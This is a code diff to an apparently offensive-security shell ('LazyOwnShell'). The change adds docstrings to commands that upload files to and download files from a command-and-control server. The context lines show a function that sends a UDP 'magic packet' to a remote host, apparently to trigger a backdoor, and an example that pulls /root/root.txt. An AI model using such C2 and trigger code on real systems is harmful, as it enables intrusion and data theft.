@@ -23200,23 +23200,33 @@ class LazyOwnShell(cmd2.Cmd):
 
         if not rhost or not rport:
             raise ValueError("rhost and rport must be specified in params")
-
-        # Ensure rport is an integer
+        
         try:
             rport = int(rport)
         except ValueError:
             raise ValueError("rport must be an integer")
 
-        # Magic packet structure
         magic_packet = struct.pack('!I4sH14s', 0xDEADBEEF, socket.inet_aton(rhost), rport, b'justforfun')
-
-        # Create a socket and send the magic packet
         with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
             sock.sendto(magic_packet, (rhost, rport))
 
         print(f"Magic packet sent to {rhost}:{rport}")
     
     def do_upload_c2(self, line):
+        """
+        Upload a file to the command and control (C2) server.
+
+        This function handles the uploading of a file to the C2 server. If no file is specified in the input line,
+        it prompts the user to enter the file extension (defaulting to 'txt') and retrieves the file using the
+        `get_users_dic` function. If a file is specified in the input line, it directly uploads that file.
+
+        Args:
+            line (str): The input line containing the file path to upload. If empty, the function will prompt the user
+                        to enter the file extension.
+
+        Returns:
+            None
+        """        
         if not line:
             extension = input("Enter the extension of file to upload: default txt ") or 'txt'
             file_up = get_users_dic(extension)
@@ -23226,6 +23236,17 @@ class LazyOwnShell(cmd2.Cmd):
         return
     
     def do_download_c2(self, line):
+        """
+        Download a file from the command and control (C2) server.
+
+        This function handles the downloading of a file from the C2 server. It requires the remote path of the file to be specified in the input line. If the input line is empty, it prints an error message and returns.
+
+        Args:
+            line (str): The input line containing the remote path of the file to download. If empty, the function will print an error message.
+
+        Returns:
+            None
+        """        
         if not line:
             print_error("Need pass the remote path to file to use this command example: download_c2 /root/root.txt")
             return
